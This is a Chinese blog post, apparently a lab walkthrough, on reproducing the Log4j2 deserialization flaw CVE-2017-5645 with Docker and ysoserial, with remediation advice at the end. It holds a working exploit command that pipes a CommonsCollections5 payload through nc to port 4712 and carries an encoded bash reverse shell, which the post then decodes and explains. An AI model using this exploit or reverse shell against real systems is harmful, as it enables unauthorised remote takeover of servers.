---
layout: post
title: "CVE-2017-5645使用-docker-搭建"
date: 2025-03-16 13:56:57 +0800
description: "介绍CVE-2017-5645"
keywords: "CVE-2017-5645(使用 docker 搭建)"
categories: ['未分类']
tags: ['网络安全']
artid: "146294629"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146294629
    alt: "CVE-2017-5645使用-docker-搭建"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146294629
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146294629
cover: https://bing.ee123.net/img/rand?artid=146294629
image: https://bing.ee123.net/img/rand?artid=146294629
img: https://bing.ee123.net/img/rand?artid=146294629
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     CVE-2017-5645(使用 docker 搭建)
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <h2 id="mZfeE">
     介绍:
    </h2>
    <p id="u19687adb">
     是一个与 Apache Log4j2 相关的安全漏洞,属于远程代码执行,它可能允许攻击者通过构造恶意的日志信息 在目标系统上执行任意代码
    </p>
    <h2>
     Log4j2 介绍
    </h2>
    <blockquote>
     <p id="uf2b8378e">
      Log4j2 是 Apache 的一个日志记录工具,属于 Java 应用的日志框架,它是 Log4j 的升级版,性能更好,功能更多.它被广泛的适用于 Java 应用程序中,帮助开发者记录程序运行的时候的日子信息,是 Java 生态系统中最重要的一个日志框架之一
     </p>
    </blockquote>
    <ul>
     <li id="u136418a0">
      漏洞编号: CVE-2017-5645
     </li>
     <li id="ua5fd95f8">
      漏洞类型:远程代码执行(RCE)
     </li>
     <li id="uf8a8e27e">
      收影响组件:Apache log4j
     </li>
     <li id="uf49808fe">
      漏洞触发原理:
     </li>
    </ul>
    <ul>
     <li>
      <ul>
       <li id="uc721fbfa">
        Log4j2 支持通过 SocketAppender 或者 SocketHubAppender 接受远程日志信息
       </li>
       <li id="u145d22dc">
        在处理这些日志信息的时候 Log4j2 会对信息进行反序列化操作
       </li>
       <li id="u7208997e">
        由于未对反序列化数据进行检查,攻击者可以构造恶意的序列化对象,嵌入恶意代码
       </li>
       <li id="uf94e1a9a">
        当系统中处理这些恶意日志消息的时候,会触发反序列漏洞,从而导致任意代码执行
       </li>
      </ul>
     </li>
    </ul>
    <ul>
     <li id="u5fd5e9cb">
      <h2>
       漏洞利用:
      </h2>
     </li>
    </ul>
    <ul>
     <li>
      <ul>
       <li id="udd945408">
        环境起来以后将会在 4712 端口开一个 tcp 服务,使用ysoserial生成 payload 发送到 4712 端口即可!
       </li>
      </ul>
     </li>
    </ul>
    <h2>
     ysoserial 介绍
    </h2>
    <p id="ua540d9cd">
     ysoserial 是一个用于生成 Java 反序列化漏洞利用代码的开源工具
    </p>
    <blockquote>
     <p>
      工具地址:
      <br/>
      https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
     </p>
    </blockquote>
    <ul>
     <li>
      <ul>
       <li id="ubc5abfd9">
        直接利用 4712 端口的 TCP 服务反弹 shell 即可
       </li>
      </ul>
     </li>
    </ul>
    <pre id="Qogos"><code class="language-java">java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjgvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}" | nc 192.168.100.102 4712</code></pre>
    <h2>
     详细介绍
    </h2>
    <blockquote>
     <p id="u5d614cd0">
      使用base64解码:YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyLjgvMTIzNCAwPiYx
     </p>
     <p id="ud561b4ff">
      结果为:bash -i &gt;&amp; /dev/tcp/192.168.12.8/1234 0&gt;&amp;1
     </p>
     <p id="u5e07f39f">
      bash -i 是一个启动交互式的 bashh shell
     </p>
     <p id="u7158ee37">
      &gt;&amp; /dev/tcp/..... 将 shell 的输入/输出重定向到 Tcp 套接字
     </p>
     <p id="ue887e164">
      0&gt;&amp;1 将标准输入(文件描述 0)和标准输出(文件描述 1)合并,并且实现双向通信
     </p>
    </blockquote>
    <p id="u795e13b4">
    </p>
    <p class="img-center">
     <img alt="" height="272" id="ucebc71ff" src="https://i-blog.csdnimg.cn/img_convert/5373769f9580b793c74e917cae45a2f9.png" width="1554"/>
    </p>
    <p id="u6f020b8c">
     这里可以看到,反弹shell 直接拿下!
    </p>
    <ul>
     <li id="u125defe4">
      修复建议:
     </li>
    </ul>
    <ul>
     <li>
      <ul>
       <li id="ue7d12f9a">
        升级到安全版本,升级到 log4j 2.8.2 或者更高的版本
       </li>
       <li id="u6c09cb36">
        禁用反序列化功能
       </li>
      </ul>
     </li>
    </ul>
    <ul>
     <li>
      <ul>
       <li>
        <ul>
         <li id="u3c2c196b">
          如果无法立即升级,可以通过配置 log4j 的反序列化功能
         </li>
        </ul>
       </li>
      </ul>
     </li>
    </ul>
    <ul>
     <li>
      <ul>
       <li id="u2337be13">
        限制网络访问
       </li>
       <li id="u040f742e">
        监控日志分析
       </li>
      </ul>
     </li>
    </ul>
    <h2>
     总结:
    </h2>
    <p>
     要理解原理，理解原理之后再去复现就会有更加深入的理解！
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f68616e6a696e6d696e673131302f:61727469636c652f64657461696c732f313436323934363239" class_="artid" style="display:none">
 </p>
</div>


